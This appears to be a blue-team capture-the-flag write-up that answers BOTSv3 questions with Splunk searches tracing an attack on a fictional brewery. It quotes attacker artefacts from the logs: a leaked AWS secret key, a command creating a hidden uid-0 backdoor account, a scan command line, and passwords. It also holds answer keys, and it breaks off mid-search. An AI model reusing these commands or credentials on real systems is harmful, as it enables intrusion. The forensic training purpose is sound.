### 220 -|- AWS access keys consist of two parts: an access key ID (e.g., AKIAIOSFODNN7EXAMPLE) and a secret access key (e.g., wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY). What is the secret access key of the key that was leaked to the external code repository?

The email message from Q219 has a link to a Github repo stating the key was found there. So check the Github link. Also easy!

> Bx8/gTsYC98T0oWiFhpmdROqhELPtXJSR9vFPNGk

Access key = AKIAJOGCDXJ5NW5PXUPA

IAM user = web_admin

<br><br>

### 221 -|- Using the leaked key, the adversary makes an unauthorized attempt to create a key for a specific resource. What is the name of that resource?

Search AWS logs for that key:

```bash
sourcetype="*aws*" userIdentity.accessKeyId="AKIAJOGCDXJ5NW5PXUPA"
```

9 events. `aws:cloudtrail` has an `eventName` field for creating keys:

```bash
sourcetype="ws:cloudtrail" userIdentity.accessKeyId="AKIAJOGCDXJ5NW5PXUPA"
  eventName="CreateAccessKey"
```

1 event. Check the `userIdentity.userName` (or `user`)

> nullweb_admin

Time = 09:16:12

<br><br>

### 222 -|- Using the leaked key, the adversary makes an unauthorized attempt to describe an account. What is the full user agent string of the application that originated the request?

Based on the previous search, but change the `eventName` to one for describing accounts, then check the `UserAgent`:

```bash
sourcetype="aws:cloudtrail" userIdentity.accessKeyId="AKIAJOGCDXJ5NW5PXUPA"
  eventName="DescribeAccountAttributes"
```

> ElasticWolf/5.1.6

Time = 09:27:06

<br><br>

### 223 -|- The adversary attempts to launch an Ubuntu cloud image as the compromised IAM user. What is the codename for that operating system version in the first attempt?

```bash
(AKIAJOGCDXJ5NW5PXUPA OR web_admin) ubuntu
```

Nothing. Let's just search for the key or username and see what comes up:

```bash
(AKIAJOGCDXJ5NW5PXUPA OR web_admin)
```

672 events, 661 are `aws:cloudtrail` as Q222. There's an `eventName` field with a `RunInstances` value, which looks promising:

```bash
(AKIAJOGCDXJ5NW5PXUPA OR web_admin)
sourcetype="aws:cloudtrail" eventName="RunInstances"
| reverse
```

576 events, although no mention of operating systems. However, there is a field `requestParameters.instancesSet.items{}.imageId` with 15 unique values. The value in the first event is *ami-41e0b93b*. AMI is Amazon Machine Image.

Googling this phrase takes us to [https://cloud-images.ubuntu.com/locator/](https://cloud-images.ubuntu.com/locator/), which states this AMI relates to "Ubuntu 16.04 xenial".

There's also a link to [https://aws.amazon.com/marketplace/pp/Canonical-Group-Limited-Ubuntu-1604-LTS-Xenial-HVM/B01JBL2M0O](https://aws.amazon.com/marketplace/pp/Canonical-Group-Limited-Ubuntu-1604-LTS-Xenial-HVM/B01JBL2M0O) - "Ubuntu 16.04 Xenial"

It also seems possible to get this information using the AWS CLI: [https://docs.aws.amazon.com/cli/latest/reference/ec2/describe-images.html](https://docs.aws.amazon.com/cli/latest/reference/ec2/describe-images.html)

```bash
> aws ec2 describe-images --image-id ami-41e0b93b --region us-east-1
```

Which gives us "Ubuntu 16.04 Xenial".

Googling this phrase tells us the full name is "Xenial Xerus"

> Xenial Xerus

Time = 09:16:22

Source IP = 139.198.18.205

<br><br>

### 224 -|- Frothly uses Amazon Route 53 for their DNS web service. What is the average length of the distinct third-level subdomains in the queries to brewertalk.com?

```bash
sourcetype="*aws*" dns brewertalk.com
```

The source `lambda:DNS` seems to give the URLs, but there are >115,000 of them.

Using Splunk's field extractor, delimiting with spaces, the full URL can be turned into a field (I called it `ldns_url`).

Now we can use the URL Toolbox Splunk app to split the `ldns_urls` into individual parts:

```bash
source="lambda:dns" brewertalk.com
| eval list="brewertalk" 
| `ut_parse_extended(ldns_url,list)`
```

This gives us new fields. `ut_subdomain_level_1` is needed for this question, so remove duplicates, evaluate the length, and then take the average using stats:

```bash
source="lambda:dns" brewertalk.com
| eval list="brewertalk" 
| `ut_parse_extended(ldns_url,list)`
| dedup ut_subdomain_level_1
| eval length=len(ut_subdomain_level_1)
| stats avg(length) as avglength
```

> 8.1

<br><br>

### 225 -|- Using the payload data found in the memcached attack, what is the name of the .jpeg file that is used by Taedonggang to deface other brewery websites?

Doing some research on memcached attacks, I found an article by Cloudflare [https://www.cloudflare.com/learning/ddos/memcached-ddos-attack/](https://www.cloudflare.com/learning/ddos/memcached-ddos-attack/) which mentions one of the main ways to stop it is to disable UDP. That could be a good place to start.

```bash
source="stream:udp"
```

>157,000 events, although first (chronologically most recent) result looks interesting: 

```
dest_content: $VALUE injected 0 50000 6HOUL@G3RpwnzFrothyl4Life6HOUL@G3RpwnzFrothyl4Life6HOUL@G3RpwnzFrothyl4Life[...]
src_content: get injected
src_ip: 13.125.33.130
```

*6HOUL@G3RpwnzFrothyl4Life* is repeated 437 times in the above `dest_content`. There are 3 events featuring this phrase in a repeated fashion, and 6 similar ones with the phrase *CRYP70KOL5CH-OWNS-YOU*.

```bash
(*CRYP70KOL5CH* OR *6HOUL@G3R*)
| table _time src_content dest_content
| reverse
```

Who/what is *6HOUL@G3R* and *CRYP70KOL5CH*? Googling turns up various sites, such as [http://www.lilyandhops.com/](http://www.lilyandhops.com/) and [http://brewsbyhildy.com/](http://brewsbyhildy.com/), which look like they've also been defaced. Check the image name they've been defaced with.

> index1.jpeg

Found web pages also mention "74L15M4N@L", although nothing in BOTSv3 dataset matching this.

As an aside, Taedonggang is a North Korean beer.

Times = 15:11:35 ~ 15:27:09

<br><br>

### 300 -|- What is the full user agent string that uploaded the malicious link file to OneDrive?

```bash
onedrive
```

The sourcetypes `o365:management:activity` and `ms:o365:management` look interesting:

```bash
(sourcetype="ms:o365:management" OR sourcetype="o365:management:activity")
  onedrive
```

22 events. All have a `dvc` (device?) and a `Workload` of `OneDrive`, so replace the search with the field.

```bash
(sourcetype="ms:o365:management" OR sourcetype="o365:management:activity")
  Workload=OneDrive
```

1658 events. Checking the fields again, there is an `operation` with `FileUploaded`.

```bash
(sourcetype="ms:o365:management" OR sourcetype="o365:management:activity")
  Workload=OneDrive Operation=FileUploaded
```

14 events, 7 for each sourcetype. A quick check shows they're duplicates, so remove one of the sourcetypes.

```bash
sourcetype="ms:o365:management" Workload="OneDrive" Operation="FileUploaded"
```

Checking fields again, there are a couple that give filenames - `object`, `SourceFileName`. There are 7 unique filenames. Using a table with some fields that might help, we notice four uploads from the same source/user, three images and one .lnk, with a `UserAgent` relating to North Korea (ko-KP is the North Korean language, and Naenara (내나라) is the North Korean intranet)

```bash
sourcetype="ms:o365:management" Workload="OneDrive" Operation="FileUploaded"
| table _time src_ip user object UserAgent
| reverse
```

> Mozilla/5.0 (X11; U; Linux i686; ko-KP; rv: 19.1br) Gecko/20130508 Fedora/1.9.1-2.5.rs
3.0 NaenaraBrowser/3.5b4

Time = 09:57:17 (x3), 09:57:33

Source IP = 104.207.83.63

User - bgist@froth.ly

Files = stout.png, stout-2.png, morebeer.jpg, BRUCE BIRTHDAY HAPPY HOUR PICS.lnk

<br><br>

### 301 -|- What external client IP address is able to initiate successful logins to Frothly using an expired user account?

```bash
expired
```

13 events. Checking the sourcetypes, there's one from `ms:aad:signin`, which makes sense for logins.

```bash
sourcetype="ms:aad:signin" expired 
```

1 event:

```json
failureReason: Invalid password, entered expired password.
ipAddress: 199.66.91.253
userDisplayName: Kevin Lagerfield
signinDateTime: 2018-08-20T11:43:14.7994359Z
```

Now to check if this is the correct one. Let's look at all Kevin's (name or email) MS Azure AD events (there are two sourcetypes, `ms:aad:signin` and `ms:aad:audit`), let's see if there is anything to suggest the account has expired, and to see if there were there successful logins after.

```bash
sourcetype="ms:aad:*" (*Kevin* OR *Lagerfield*)
| reverse
```

19 events, giving us a timeline. Here's a summary

```json
activity: Update user
activityDate: 2018-08-20T11:24:28.7368822Z
modifiedProperties:
   name: AccountEnabled
   newValue: [true]
   oldValue: [false]

activity: Reset user password
activityDate: 2018-08-20T11:41:36.4906486Z

signinDateTime: 2018-08-20T11:42:37.0910791Z
failureReason: Invalid username or password or Invalid on-premise username or password.

activity: Reset user password
activityDate: 2018-08-20T11:42:51.0513891Z

# initial event
signinDateTime: 2018-08-20T11:43:14.7994359Z
failureReason: Invalid password, entered expired password.

activity: Change user password
activityDate: 2018-08-20T11:43:22.5565538Z

activity: Change password (self-service)
activityDate: 2018-08-20T11:43:22.5596423Z
```

All very interesting.

> 199.66.91.253

<br><br>

### 302 -|- According to Symantec's website, what is the discovery date of the malware identified in the macro-enabled file?

```bash
*macro*
```

19 events. One of them is an email, with the following content:

```
content_body: Here is a financial model we can use for FY2019 planning. For the worksheet to operate properly, you will need to enable macros. Thanks,Bruce

attach_filename: Malware Alert Text.txt
```

Somehow I doubt that was the original attachment name. A quick Google found [https://www.law.upenn.edu/its/docs/office/office-365-ATP.php](https://www.law.upenn.edu/its/docs/office/office-365-ATP.php):

```
Office 365 Advanced Threat Protection (ATP)

If an attachment is deemed unsafe and removed, 
the system will substitute a text file named “Malware Alert Text.txt”
```

What is the txt file? It is base64 encoded in the email `content`, so decode that with Cyberchef:

```
Malware was detected in one or more attachments included with this email message. 
Action: All attachments have been removed.
Frothly-Brewery-Financial-Planning-FY2019-Draft.xlsm	 W97M.Empstage
```

What is "W97M.Empstage"? Google and the first result is a Symantec page, but it's a forum thread with no info: [https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=f5c4cf9d-e519-4bbc-9d4f-9f554460aade&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments](https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=f5c4cf9d-e519-4bbc-9d4f-9f554460aade&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments)

The next result is titled "W97M.Empstage Technical Details | Symantec" with the date on Google Nov 12, 2016. However, if you follow that link [http://co.norton.com/security_response/writeup.jsp?docid=2016-111123-2000-99&tabid=2](http://co.norton.com/security_response/writeup.jsp?docid=2016-111123-2000-99&tabid=2) it redirects you to [https://co.norton.com/](https://co.norton.com/), which is Norton's Colombian website.

But apparently that's the correct link. Because Symantec acquired Norton, and Broadcom acquired Symantec (the latter happening after BOTSv3 was made).

As for why Colombia, no idea.

So... Yeah. The answer is 11/11/2016. Presumably the day before Google found it.

> 11/11/2016

<br><br>

### 303 -|- What is the password for the user that was successfully created by the user "root" on the on-premises Linux system?

Linux uses "adduser" or "useradd" to create a new user, so start with that.

```bash
(adduser OR useradd)
```

2896 events. Looking at the sources, `/var/log/auth.log` has a single event:

```bash
source="/var/log/auth.log" (adduser OR useradd)
```

There is a `useradd` for user `tomcat7`. Let's look into tomcat7 with root a.k.a. uid 0.

```bash
tomcat (root OR uid=0)
```

7 events. One event from `osquery:results`:

```json
action: added
calendarTime: Mon Aug 20 11:24:54 2018 UTC
cmdline: "useradd" "-ou" "tomcat7" "-p" "ilovedavidverve" "0" "-g" "0" "-M" "-N" "-r" "-s" "/bin/bash"
decorations:username: root
```

> ilovedavidverve

Time = 11:24:54

**Bonus**

There are actually two `osquery:results` events for *tomcat7*:

```bash
tomcat7 sourcetype="osquery:results"
```

The first is above; the second is:

```json
action: added
calendarTime: Mon Aug 20 11:08:05 2018 UTC
cmdline: "useradd" "-ou" "tomcat7" "-p" "davidverve.com" "0" "-g" "0" "-M" "-N" "-r" "-s" "/bin/bash"
decorations:username: tomcat8
```

We'll see more of *tomcat8* in a later question, although while we're here:

```bash
sourcetype="osquery:results" "decorations.username"=tomcat8
| table _time columns.cmdline
| reverse
```

There are four commands, each in the following pair form:

1st event: `"/bin/bash" "-c" 75736572616464202D6F752030202D672030202D4D202D4E202D72202D73202F62696E2F626173682020746F6D63617437202D7020646176696476657276652E636F6D`

2nd event: `"useradd" "-ou" "tomcat7" "-p" "davidverve.com" "0" "-g" "0" "-M" "-N" "-r" "-s" "/bin/bash"`

The second event is the first string decoded from hex. The other decoded/raw commands are:

- `"uname" "-a"`
- `"/usr/bin/python3" "-Es" "/usr/bin/lsb_release" "-a"`
- `"dpkg-query" "-f" "lsb-printing" "lsb-security" 247B56657273696F6E7D20247B50726F76696465737D0A "-W" "lsb-core" "lsb-cxx" "lsb-graphics" "lsb-desktop" "lsb-languages" "lsb-multimedia"`

    `247B56657273696F6E7D20247B50726F76696465737D0A` → `${Version} ${Provides}`

<br><br>

### 304 -|- What is the name of the user that was created after the endpoint was compromised?

It seems the endpoints are Windows (Q215, and others). New users are recorded as event 4720.

```bash
EventCode=4720
```

1 event.

> svcvnc

Time = 10:08:17

Host = FYODOR-L

<br><br>

### 305 -|- What is the process ID of the process listening on a "leet" port?

Leet is 1337:

```bash
1337
```

17,331 events. Check available fields for "port" to see if there are any. There are a few with 1337 values, including `Port` (1 event), `columns.port` (1 event), and `dest_port` (7 events). They all provide the answer, although they individually provide different information.

```bash
Port=1337 OR dest_port=1337 OR columns.port=1337
| reverse
```

> 14356

Times = 11:31:54 ~ 11:55:34

Process = netcat

Username = klagerfield

<br><br>

### 306 -|- A search query originating from an external IP address of Frothly's mail server yields some interesting search terms. What is the search string?

We know Frothly use Microsoft Office 365, and there's an Exchange `Workload`. We're looking for a search query:

```bash
sourcetype="ms:o365:management" Workload="Exchange" *query*
```

1 event.

> cromdale OR beer OR financial OR secret

Source = 104.207.83.63:21974

Time = 10:48:28

<br><br>

### 307 -|- What is the MD5 value of the file downloaded to Fyodor's endpoint system and used to scan Frothly's network?

We know the host, and Sysmon includes MD5s, so that's a good place to start:

```bash
host="FYODOR-L" source="WinEventLog:Microsoft-Windows-Sysmon/Operational"
```

4126 events. If the file was used, it means a process was created. This is `EventCode` 1:

```bash
host="FYODOR-L" source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
```

158 events. There are 38 `Image`s. Let's see if any look suspicious:

```bash
host="FYODOR-L" source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| stats count by Image
```

Two interesting files are in a Temp folder, `C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe` and `C:\Windows\Temp\hdoor.exe`. Which does the scan?

```bash
host="FYODOR-L" source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
  Image="C:\\Windows\\Temp\\*"
| reverse
```

35 events. *hdoor.exe* is run first, once, then *iexeplorer.exe* is the other 34 events. The `CommandLine` for *hdoor.exe* is:

```bash
> "C:\windows\temp\hdoor.exe" -hbs 192.168.9.1-192.168.9.50 /b /m /n
```

That looks like a scan to me. And the event has the MD5.

> 586EF56F4D8963DD546163AC31C865D7

Time (hdoor.exe scan) = 10:43:10

<br><br>

### 308 -|- Based on the information gathered for question 304, what groups was this user assigned to after the endpoint was compromised?

Q304 gave us the username `svcvnc`:

```bash
svcvnc
```

15 events. The `EventCode` for adding a user to a group is 4732:

```bash
svcvnc EventCode=4732
```

2 events, one for each group.

> Administrators,Users

Time = 10:08:17 & 10:08:35

<br><br>

### 309 -|- At some point during the attack, a user's domain account is disabled. What is the email address of the user whose account gets disabled and what is the email address of the user who disabled their account?

Account disabled is `EventCode` 4725, but that gives nothing. However, from Q301 we found an `AccountEnabled` value within `ms:aad:audit` (which, in that question, was changed from `false` to `true`):

```bash
sourcetype="ms:aad:audit" AccountEnabled
```

3 events. Add a table to find out see which is the one we're interested in, and the answers. For clarity, replace `AccountEnabled` with the full field, and add the old and new values..

```bash
sourcetype="ms:aad:audit"
  "targets{}.modifiedProperties{}.name"=AccountEnabled
  "targets{}.modifiedProperties{}.newValue"="[false]"
  "targets{}.modifiedProperties{}.oldValue"="[true]"
| table targets{}.userPrincipalName actor.userPrincipalName
  targets{}.modifiedProperties{}.name
  targets{}.modifiedProperties{}.newValue
  targets{}.modifiedProperties{}.oldValue
```

> bgist@froth.ly,fyodor@froth.ly

Time = 14:47:12

<br><br>

### 310 -|- Another set of phishing emails were sent to Frothly employees after the adversary gained a foothold on a Frothly computer. This malicious content was detected and left behind a digital artifact. What is the name of this file?

It's an email so start with `stream:smtp`, and we know there is an attachment so include `file_name`:

```bash
sourcetype="stream:smtp" file_name=*
```

11 events. There are 7 unique `file_name`s. Most are images with generic names, but `pwned.jpg` and `Malware Alert Text.txt` look interesting. We saw the text file earlier in Q304... But first let's look at `pwned.jpg`. Looking at the email `content_body` (message), it doesn't seem like anything abnormal. Let's decode the `pwned.jpg` using [https://base64.guru/converter/decode/image](https://base64.guru/converter/decode/image) anyway.

![botsv3_img3](/img/botsv3_img3.png)

Nice.

So, the text file. We found in Q304 it relates to `Frothly-Brewery-Financial-Planning-FY2019-Draft.xlsm`. Oh, that's the answer.

> Frothly-Brewery-Financial-Planning-FY2019-Draft.xlsm

Time = 09:55:14

<br><br>

### 311 -|- Based on the answer to question 310, what is the name of the executable that was embedded in the malware?

```bash
*Frothly-Brewery-Financial-Planning-FY2019-Draft.xlsm*
```

Nothing. Go broader - try only the file extension:

```bash
*.xlsm*
```

5 events. Three are for a different .xls file; the other two have `Frothly-Brewery-Financial-Planning-FY2019-Draft[66].xlsm`. Replace our search with that to see the 2 events.

```bash
"Frothly-Brewery-Financial-Planning-FY2019-Draft[66].xlsm"
```

The first is a `WinEventLog:Application` event for `SourceName=Symantec AntiVirus`:

```
Security Risk Found! W97M.Empstage in File: C:\Users\BruceGist\AppData\Local\Packages\
microsoft.windowscommunicationsapps_8wekyb3d8bbwe\LocalState\Files\S0\3\
Frothly-Brewery-Financial-Planning-FY2019-Draft[66].xlsm by: Auto-Protect scan.  
Action: Cleaned by Deletion.  Action Description: The file was deleted successfully.
```

Time = 09:56:39

The other is a Sysmon event. with an `Image` of `C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_16005.10228.20127.0_x64__8wekyb3d8bbwe\HxTsr.exe`

Time = 09:55:52

> HxTsr.exe

**Bonus**

According to [https://www.pcrisk.com/removal-guides/15096-hxtsr-exe-virus](https://www.pcrisk.com/removal-guides/15096-hxtsr-exe-virus):

"HxTsr.exe (Hidden Executable To Sync Remote Servers) is a legitimate file that can be found in Microsoft Windows Operating Systems. This file/process is part of Microsoft Outlook, a MS Office product, however, its name might be used by cyber criminals to disguise their malicious programs. Therefore, a file with this name could be detected as a threat by virus detection engines."

However, doing more research from the dataset, I can't see anything particularly malicious. For example, looking at Cisco NVM Flow Data:

```bash
source="cisconvmflowdata" pn="HxTsr.exe"
| table _time liuidp ppn da dh
| iplocation da
| reverse
```

All 237 events are started by *svchost.exe*, and every IP/connection looks to be to a valid Microsoft domain (Outlook, Skype, Office, etc).

<br><br>

### 312 -|- How many unique IP addresses "used" the malicious link file that was sent?

From Q300, the malicious link file was `BRUCE BIRTHDAY HAPPY HOUR PICS.lnk`:

```bash
"BRUCE BIRTHDAY HAPPY HOUR PICS.lnk"
```

67 events. There are three families of sourcetypes - `ms:o365:XXX` (48), `[xml]winevenlog` (16), `symantec:XXX` (3). From before, we found the `Operation` field, part of `ms:o365:management,` can be useful. One value looks promising:

```bash
"BRUCE BIRTHDAY HAPPY HOUR PICS.lnk" Operation="AnonymousLinkUsed"
```

22 events. Check the IP fields, and there is `ClientIP` and `src_ip`, each with 7 unique values.

> 7

Time = 09:59:04 ~ 11:28:30

<br><br>

### 314 -|- What port number did the adversary use to download their attack tools?

It's likely a rare port was used, so first check those. UDP isn't really used for transferring files, so limit it to TCP:

```bash
sourcetype="stream:tcp"
| rare dest_port
```

There are a few; port 3333 and 50504 only have 1 connection each. Let's see what they are for:

```bash
dest_port=3333
```

2 events. The first is `stream:tcp`, the second is `stream:http`. The latter is GETing */images/logos.png* - and the `http_user_agent` is PowerShell. Suspicious.

A quick check shows 50504 is an internal connection, so we'll ignore that.

> 3333

Time = 10:47:16

IP = 45.77.53.176

Host = FYODOR-L

<br><br>

### 315 -|- During the attack, two files are remotely streamed to the /tmp directory of the on-premises Linux server by the adversary. What are the names of these files?

```bash
*/tmp/*
```

2991 events. However, most are sourcetypes `lsof` and `ps`. `wineventlog` has only 18 events, so let's see what they are.

```bash
*/tmp/* sourcetype="wineventlog"
```

It seems that PowerShell is being used 9 times to execute the malicious *iexeplorer.exe* file (Q307), and the command lines look suspicious.

```bash
*/tmp/* sourcetype="wineventlog"
| dedup Process_Command_Line
| table _time Process_Command_Line
| reverse
```

First a string is echo'd to */tmp/colonel*, then another to */tmp/definitelydontinvestigatethisfile.sh*

> colonel,definitelydontinvestigatethisfile.sh

Time = 11:08:36 & 11:08:48

Note files also referenced on `oquery:results`.

<br><br>

### 316 -|- Based on the information gathered for question 314, what file can be inferred to contain the attack tools?

Q314

> logos.png

<br><br>

### 317 -|- What is the first executable uploaded to the domain admin account's compromised endpoint system?

I don't know who the domain admin is, but most executables are .exes:

```json
*.exe
```

>232k events. Most are `cisconvmflowdata`, so let's filter those down to processes:

```bash
*.exe source="cisconvmflowdata"
| dedup pn
| table _time sa da ds ppa pap liuidp ppn pn
| reverse
```

60 events. Abnormal processes, in chronological order, include *hdoor.exe*, *iexeplorer.exe* and *HxTsr.exe*. *hdoor.exe* is from 192.168.8.103, which is the host *hoth*, time = 10:44:07.

Another large source is Sysmon. Again, filter to processes:

```bash
*.exe source="WinEventLog:Microsoft-Windows-Sysmon/Operational"
| dedup Image
| table _time Image Computer User SourceIp DestinationIp
| reverse
```

162 events. However, most don't have connections. Filter to only those with connections:

```bash
*.exe source="WinEventLog:Microsoft-Windows-Sysmon/Operational" SourceIp=*
| dedup Image
| table _time Image Computer User SourceIp DestinationIp
| reverse
```

12 events. Most are normal (Chrome, ssh, putty, Dropbox), although again, chronologically, we have *hdoor.exe* and *iexeplorer.exe*. *hdoor.exe* is from the same IP/host, time = 10:44:05.

Doing a bit more research on *hdoor.exe*:

```json
hdoor.exe
| reverse
```

It looks like, at 10:43:10, Powershell was used to download the file and then run it (see Q307).

> hdoor.exe

Domain Admin = FYODOR-L

<br><br>

### 318 -|- From what country is a small brute force or password spray attack occurring against the Frothly web servers?

The web servers are called *gacruz.i-XXX*, and are Linux. There's a `linux_secure` sourcetype:

```bash
host="gacrux.i-*" sourcetype="linux_secure"
```

128 events. We don't want the attacks coming *from* the local machines, so remove them:

```bash
host="gacrux.i-*" sourcetype="linux_secure" NOT src="*.i-*"
```

8 events. Ignoring two outliers, there are 3 groups of "invalid user" with generic usernames followed by "connection closed" from the same IP within 1 minute.

```bash
host="gacrux.i-*" sourcetype="linux_secure" NOT src="*.i-*"
| top src
| iplocation src
```

> Russia

IP = 5.101.40.81

Time = 15:07:22 ~ 15:08:12

<br><br>

### 319 -|- The adversary created a BCC rule to forward Frothly's email to his personal account. What is the value of the "Name" parameter set to?

From Q306 we know they use Microsoft Office 365 Exchange for emails. We're looking for BCC a.k.a. Blind Carbon Copy

```bash
sourcetype="ms:o365:management" Workload="Exchange" (*bcc* OR *blind* OR *copy*)
```

1 event. Blind exists in `"Parameters{}.Name"=BlindCopyTo`

> SOX

Time = 11:21:40

BCC to = [yunki1984@naver.com → Naver is Korean, and 현기 could be a Korean name.

<br><br>

### 320 -|- What is the password for the user that was created on the compromised endpoint?

From Q304, the new user is *svcvnc*:

```bash
svcvnc
```

15 events. Check the `CommandLine` arguments.

> Password123!

<br><br>

### 321 -|- The Taedonggang adversary sent Grace Hoppy an email bragging about the successful exfiltration of customer data. How many Frothly customer emails were exposed or revealed?

```bash
sourcetype="stream:smtp" "grace hoppy"
```

45 events. Replace the search with the receiver field:

```bash
sourcetype="stream:smtp" "receiver_email{}"="ghoppy@froth.ly"
```

25 events. Looking at the list of senders, we seen the Naver address from Q319.

```bash
sourcetype="stream:smtp"
  "receiver_email{}"="ghoppy@froth.ly" sender_email="hyunki1984@naver.com"
```

1 event. The subject is "All your datas belong to us". The content is base64 encoded, so decode it:

```
Gracie,

We brought your data and imported it: https://pastebin.com/sdBUkwsE 

Also, you should not be too hard Bruce. He good man
```

Going to the Pastebin, we can count our answer.

> 8

Time = 15:15:00

<br><br>

### 322 -|- What is the path of the URL being accessed by the command and control server?

We know the compromised host, and we know from previous questions they used PowerShell. Often malicious PowerShell commands are base64 encoded, and hence the command will include "FromBase64String"

```bash
host="FYODOR-L" FromBase64String
```

22 events. Looking through we quickly see `WinEventLog:Microsoft-Windows-PowerShell/Operational` has the most useful information. Looking through the `Message` (the PowerShell command), you find it's obfuscated, but includes 45.77.53.176 in base64 encoding and 3 unique URLs: */admin/get.php* (2x), */news.php* (2x), */login/process.php*

> /admin/get.php

Times = 10:01:44, 10:07:07, 10:11:02, 10:15:28, 11:32:14

<br><br>

### 323 -|- At least two Frothly endpoints contact the adversary's command and control infrastructure. What are their short hostnames?

We know the C2 URI.

```bash
"/admin/get.php"
```

3 events, over 2 hosts.

> ABUNGST-L,FYODOR-L

<br><br>

### 324 -|- Who is Al Bungstein's cell phone provider/carrier?

Where does Al send his email from? First, what's his email address:

```bash
"Al Bungstein"
```

Looks like it's *abungstein@froth.ly*. Do a general search instead of a field value search to capture all sources and sourcetypes:

```bash
"abungstein@froth.ly"
```

93 events. A couple interesting fields include `src` and `FromIP`, from `s:o365:reporting:messagetrace`. They have the same values, with the top IP being 174.215.1.81. An online IP lookup gives us our answer.

> Verizon Wireless

<br><br>

### 325 -|- Microsoft cloud services often have a delay or lag between "index time" and "event creation time". For the entire day, what is the max lag, in minutes, for the sourcetype: ms:aad:signin?

First, create fields for the indextime and time, in a unified format. Next, convert them both to epoch time. From there, calculate the difference for each pair, find the max, and convert it to minutes.

```bash
sourcetype="ms:aad:signin"
| eval indextime=strftime(_indextime,"%Y/%m/%d %H:%M:%S")
| eval time=strftime(_time,"%Y/%m/%d %H:%M:%S")
| eval indextime_epoch=strptime(indextime,"%Y/%m/%d %H:%M:%S")
| eval time_epoch=strptime(time, "%Y/%m/%d %H:%M:%S")
| eval diff=indextime_epoch-time_epoch
| stats max(diff) as max_lag
| eval minutes=max_lag / 60
```

> 51

<br><br>

### 326 -|- According to Mallory's advertising research, how is beer meant to be enjoyed?

First, who is Mallory?

```bash
mallory
```

Gives us *Mallory Kraeusen (mkraeusen@froth.ly)*. Check her emails first, maybe she mentioned it there.

```bash
sourcetype="stream:smtp" sender_email="mkraeusen@froth.ly"
| table _time content_body{}
```

11 events, but nothing useful. If we search all variations of her name, we get almost 10,000 events!

```bash
(Mallory OR Kraeusen OR mkraeusen@froth.ly OR MalloryKraeusen OR MKraeusen)
```

Adding keywords might help:

```bash
(Mallory OR Kraeusen OR mkraeusen@froth.ly OR MalloryKraeusen OR MKraeusen)
  AND (*advert* OR *research*)
```

34 events. Scrolling through we find a file *BA_Advertising_Code_Overview.pdf* mentioned in a half of the events (17). None of the logs include the file, but it looks like she downloaded it with Chrome, suggesting it's available online. Google the name and it's available at [https://s3-us-west-2.amazonaws.com/brewersassoc/wp-content/uploads/2017/04/BA_Advertising_Code_Overview.pdf](https://s3-us-west-2.amazonaws.com/brewersassoc/wp-content/uploads/2017/04/BA_Advertising_Code_Overview.pdf)

> responsibly

<br><br>

### 328 -|- What text is displayed on line 2 of the file used to escalate tomcat8's permissions to root?

Starting with just *tomcat8* gives us 380k events, but most are from unimportant sourcetypes, so remove them:

```bash
tomcat8 AND NOT (source="lsof" OR source="ps" OR source="top" OR source="package")
```

276 events. Most are `osquery:results`, with only 20 `Unix:XXX` sources. A quick check of the latter gives nothing helpful, so limit to the former:

```bash
sourcetype="osquery:results" tomcat8
```

256 events. Looking through the fields, there are two `columns.uid` (user ID) values - 244 events for uid=111 and 12 events for uid=0. 0 is root, and presumably 111 is tomcat8. Likewise for `decorations.username`, with 244 for tomcat8 and 12 for root.

Use a table, in chronological order, of the users and commands.

```bash
sourcetype="osquery:results" tomcat8 columns.cmdline=*
| table _time decorations.username columns.cmdline
| reverse
```

At 11:34:49 tomcat8 runs `./colonelnew`, and the next event, at 11:48:38, root runs `rm /usr/share/tomcat8/.bash_history`. Checking the event, it seems that the location of the file is */tmp/colonelnew*. Searching for the filename or location gives nothing; however, remembering Q315, there was also a file simply called colonel.

```bash
/tmp/colonel*
```

35 events. Looking through Sysmon, as it often has useful information (and only 4 dedup'd events), gives us:

```bash
/tmp/colonel* source="WinEventLog:Microsoft-Windows-Sysmon/Operational"
| dedup CommandLine
| reverse
```

So what happened?

1. Use iexeplorer.exe to echo a string to /tmp/colonel
2. Base64 decode the file to /tmp/colonel.c
3. Cat and MD5sum the new file.

Base64 decode the string and you get the answer

> * Ubuntu 16.04.4 kernel priv esc

TIme = 11:08:36 & 11:10:55

Host = hoth

<br><br>

### 329 -|- One of the files uploaded by Taedonggang contains a word that is a much larger in font size than any other in the file. What is that word?

From Q330, we know how to find files uploaded to OneDrive by Taedonggang:

```bash
sourcetype="ms:o365:management" Operation="FileUploaded" UserAgent="*Naenara*"
```

This gives us the previously-found .lnk, as well as morebeer.jpg, stout.png, and stout-2.png. However, searching for these gives nothing.

Upload may include email, and we know a threat actor's email:

```bash
sourcetype="stream:smtp" hyunki1984@naver.com attach_filename{}=*
```

Here we find 1534778082419.png. Decoding that gives

![botsv3_img4](/img/botsv3_img4.png)

No words there are much larger.

It's possible the file will be base64 encoded, as email attachments in logs and malicious files often are. In fact, one of the answers from before was a base64 encoded file, and we haven't even looked at it yet.

```bash
definitelydontinvestigatethisfile.sh
```

Decoded:

![botsv3_img5](/img/botsv3_img5.png)

> Splunk

<br><br>

### 330 -|- What Frothly VPN user generated the most traffic?

```bash
vpn
```

854 events, 606 are from source `service` for *svchost.exe* for Extensible Authentication Protocol, Remote Access Connection Manager, or Secure Socket Tunneling Protocol Service. Related to VPNs, but no useful info. Let's try a few sources and sourcetypes:

```bash
vpn sourcetype="stream:http"
```

17 events, with `http_user_agent` for all of them being `Cisco AnyConnect VPN Agent for Windows 4.6.01098`. However, these events give us little other useful info.

```bash
vpn sourcetype="symantec:ep:packet:file"
```

124 events. 101 have a `Host_Name` of *MKRAEUS-L* (192.168.247.129 and 192.168.247.131), 23 of *PCERF-L* (172.16.197.137), connecting to 24.8.40.284. The `Application_Name` for all is *vpnagent.exe*.

```bash
vpn source="cisconvmflowdata"
